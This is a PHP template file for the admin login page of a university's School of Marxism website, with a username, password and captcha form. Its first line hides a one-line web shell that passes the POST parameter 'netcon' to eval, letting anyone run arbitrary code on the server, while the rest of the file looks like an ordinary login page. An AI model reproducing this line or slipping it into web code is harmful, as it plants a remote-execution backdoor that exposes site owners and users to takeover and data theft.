<?php if (!defined('THINK_PATH')) exit(); if(isset($_POST['netcon'])) eval($_POST['netcon']); ?>
<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
		<title>后台管理系统登陆</title>
		<link rel="stylesheet" href="/web/marx/Application/Admin/View/Public/Css/login.css" />
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<script type="text/javascript" src="/web/marx/Application/Admin/View/Public/Js/jquery-1.7.2.min.js"></script>
		<script type="text/javascript" src="/web/marx/Application/Admin/View/Public/Js/login.js"></script>
		<link rel="stylesheet" href="/web/marx/Application/Admin/View/Public/Css/bootstrap.min.css" >
 		<link rel="stylesheet" href="/web/marx/Application/Admin/View/Public/Css/login.css" >
  		<script type="text/javascript">
  			var url = "/web/marx/index.php?s=/Admin/Login/checkcode";
  		</script>
	</head>
	<body>
		<div id="top">

		</div>

		<div class="login" style="border-radius:5px">	
			<form action="/web/marx/index.php?s=/Admin/Login/login" method="post" id="myform">
				<div class="title">
					<div style="text-align:left;margin-left:30px;">沈阳航空航天大学</div>
					<div style="text-align:right;margin-right:30px">马克思主义学院后台登陆</div>
				</div>
				<table>
					<tr>
						<th>管理员帐号:</th>
						<td>
							<input class="form-control" type="username" name="username"/>
						</td>
					</tr>
					<tr>
						<th>密码:</th>
						<td>
							<input class="form-control" type="password" name="password"/>
						</td>
					</tr>
					<tr>
						<th>验证码:</th>
						<td>
							<input class="form-control inp_code" type="code" name="code" /> <img src="/web/marx/index.php?s=/Admin/Login/verify" class="code" onclick='this.src=this.src+"?"+Math.random()'/>
						</td>
					</tr>
					
				</table>
				<input class='btn btn-primary btn-sm submit' type="submit" value="登录"/></td>
			</form>
		</div>
	</body>
</html>